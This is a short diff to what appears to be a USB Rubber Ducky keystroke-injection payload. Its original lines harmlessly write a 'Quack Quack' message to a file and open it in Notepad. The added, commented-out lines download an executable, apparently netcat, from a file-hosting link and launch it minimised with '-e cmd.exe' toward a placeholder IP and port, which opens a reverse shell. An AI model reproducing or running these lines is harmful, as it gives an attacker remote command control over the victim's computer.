@@ -1,3 +1,7 @@
 echo "This is my rubber ducky!!!" > .\msg.txt
 echo "Quack Quack" >> .\msg.txt
 start notepad .\msg.txt
+
+#wget 'https://1fichier.com/?dtc7uqmikl' -OutFile ncsh.exe
+#START /MIN ncsh.exe IP PORT -e cmd.exe -d
+
